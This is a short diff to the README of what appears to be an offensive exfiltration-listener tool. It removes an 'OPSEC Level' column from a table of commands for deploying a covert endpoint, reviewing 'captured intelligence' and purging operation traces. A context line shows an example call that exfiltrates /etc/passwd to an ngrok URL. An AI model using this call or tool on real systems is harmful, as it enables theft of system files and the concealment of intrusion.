@@ -120,13 +120,13 @@ exfiltrate_file("/etc/passwd", "https://your-ngrok-url.ngrok.io")
 
 | Command | Purpose | OPSEC Level |
 |---------|---------|-------------|
-| `start` | Deploy covert endpoint | 🟢 High |
-| `status` | Check operational status | 🟢 High |
-| `requests` | Review captured intelligence | 🟢 High |
-| `show <id>` | Analyze specific payload | 🟢 High |
-| `export` | Extract operation data | 🟡 Medium |
-| `kill` | Terminate and cleanup | 🟢 High |
-| `clear` | Purge operation traces | 🟢 High |
+| `start` | Deploy covert endpoint |
+| `status` | Check operational status |
+| `requests` | Review captured intelligence |
+| `show <id>` | Analyze specific payload |
+| `export` | Extract operation data |
+| `kill` | Terminate and cleanup |
+| `clear` | Purge operation traces |
 
 ## 🎮 TUI Operational Controls
 
